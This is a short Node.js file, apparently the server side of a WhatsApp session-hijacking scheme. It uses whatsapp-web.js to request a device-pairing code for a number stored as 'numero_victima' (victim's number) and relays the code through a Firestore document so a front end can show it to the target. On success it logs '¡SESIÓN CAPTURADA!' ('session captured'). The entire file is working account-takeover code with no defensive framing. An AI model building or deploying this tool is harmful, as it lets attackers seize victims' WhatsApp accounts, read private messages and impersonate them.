const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "global_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process'],
        executablePath: '/usr/bin/google-chrome-stable'
    }
});

db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    const data = snap.data();
    if (data && data.status === "solicitando_codigo" && !data.pairingCode) {
        console.log("Generando código para:", data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
        } catch (e) { console.log("Error solicitando codigo:", e); }
    }
});

client.on('ready', () => {
    console.log("¡SESIÓN CAPTURADA!");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito", lastSession: new Date() });
});

client.initialize();
http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(process.env.PORT || 3000);
